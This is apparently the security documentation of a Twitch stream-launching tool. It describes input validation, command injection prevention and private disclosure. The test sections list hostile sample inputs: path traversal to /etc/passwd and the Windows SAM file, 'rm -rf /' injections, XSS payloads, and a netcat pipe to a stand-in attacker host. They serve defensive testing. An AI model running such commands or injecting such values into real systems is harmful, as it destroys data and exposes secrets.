Security Documentation
======================

TwitchAdAvoider implements comprehensive security measures to protect users from various attack vectors.
This document outlines the security architecture and best practices.

Security Architecture
---------------------

TwitchAdAvoider follows a defense-in-depth security model with multiple layers of protection:

**Input Validation Layer**
    All user inputs are validated and sanitized through dedicated validation functions in ``src/validators.py``.

**Path Traversal Prevention** 
    File paths are validated to prevent ``../`` sequences and dangerous characters.

**Command Injection Prevention**
    Player arguments are sanitized to block shell metacharacters and command injection attempts.

**Pattern-based Attack Detection**
    Regex patterns detect various attack vectors including SQL injection, XSS, and path traversal.

Input Validation
----------------

Channel Name Validation
~~~~~~~~~~~~~~~~~~~~~~~

Channel names are validated using the ``validate_channel_name()`` function:

* Must match Twitch username pattern (4-25 characters, alphanumeric + underscore)
* Blocked patterns: path traversal (``../``), command injection (``;``, ``|``, ``&``)
* Case normalization and whitespace trimming
* Security pattern detection for common attack vectors

File Path Validation
~~~~~~~~~~~~~~~~~~~~

File paths are validated using the ``validate_file_path()`` function:

* Path traversal protection (blocks ``..`` sequences)
* Dangerous character filtering (null bytes, control characters)
* Length limits (max 1000 characters)
* Optional existence checking
* Absolute path resolution

Player Arguments Sanitization
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Player arguments are sanitized using the ``sanitize_player_args()`` function:

* Shell metacharacter blocking (``|``, ``&``, ``;``, ``$``, etc.)
* Command injection pattern detection
* Quote balancing validation
* Length limits (max 500 characters)
* Safe argument parsing

Security Testing
-----------------

The application includes comprehensive security tests covering:

**Malicious Input Patterns**::

    # Path traversal attempts
    '../../../etc/passwd'
    '..\\..\\..\\windows\\system32\\config\\sam'
    
    # Command injection attempts  
    'channel; rm -rf /'
    'channel && whoami'
    'channel | id'
    
    # XSS attempts
    '<script>alert("xss")</script>'
    'javascript:alert(1)'

**File Path Attacks**::

    # Directory traversal
    '../../../../etc/hosts'
    'C:\\..\\..\\Windows\\System32\\'
    
    # Null byte injection
    'normal.txt\x00.exe'
    
    # Control character injection
    'file\r\nmalicious_command'

**Player Argument Injection**::

    # Shell command injection
    '--volume=50; rm -rf /'
    '--fullscreen && whoami'
    '--cache=yes | netcat attacker.com 4444'

Best Practices for Contributors
-------------------------------

When contributing to TwitchAdAvoider, follow these security guidelines:

**Always Validate User Input**::

    # ✓ Good: Use existing validation functions
    from src.validators import validate_channel_name
    
    def process_channel(channel: str) -> str:
        return validate_channel_name(channel)
    
    # ✗ Bad: Direct use without validation
    def process_channel(channel: str) -> str:
        return channel.lower()  # No validation!

**Prevent Command Injection**::

    # ✓ Good: Use subprocess with argument list
    subprocess.run(['streamlink', f'twitch.tv/{channel}', quality])
    
    # ✗ Bad: String concatenation with shell=True
    os.system(f"streamlink twitch.tv/{channel} {quality}")

**Validate File Paths**::

    # ✓ Good: Use validation function
    from src.validators import validate_file_path
    
    def load_config(config_path: str) -> dict:
        validated_path = validate_file_path(config_path)
        with open(validated_path, 'r') as f:
            return json.load(f)

**Include Security Tests**::

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        malicious_args = [
            '--volume=50; rm -rf /',
            '--fullscreen && whoami', 
            '--cache=yes | id',
        ]
        for args in malicious_args:
            with self.assertRaises(ValidationError):
                sanitize_player_args(args)

Security Reporting
------------------

**Do not report security issues publicly**. Instead:

1. Email security concerns privately to the maintainers
2. Include detailed reproduction steps
3. Provide impact assessment
4. Allow time for coordinated disclosure

We take security seriously and will respond promptly to legitimate security reports.

Security Acknowledgments
------------------------

We appreciate security researchers who help make TwitchAdAvoider safer for everyone.
Contributors who report security issues will be acknowledged (with permission) in release notes.